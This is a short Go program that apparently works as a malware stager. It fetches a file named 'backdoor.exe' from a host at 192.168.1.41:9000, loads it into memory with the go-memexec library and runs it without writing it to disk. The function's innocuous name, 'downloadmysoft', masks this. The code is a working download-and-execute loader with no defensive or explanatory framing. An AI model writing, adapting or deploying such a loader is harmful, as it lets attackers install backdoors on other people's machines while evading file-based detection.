package main

import (
	"io"
	"net/http"

	"github.com/amenzhinsky/go-memexec"
)

func downloadmysoft() {
	
	resp, err := http.Get("http://192.168.1.41:9000/backdoor.exe")
	if err != nil {
		return
		
	}
	defer resp.Body.Close()
	result, _ := io.ReadAll(resp.Body)
	exe, _ := memexec.New(result)
	defer exe.Close()
	exe.Command()
}

func main() {
	downloadmysoft()
}
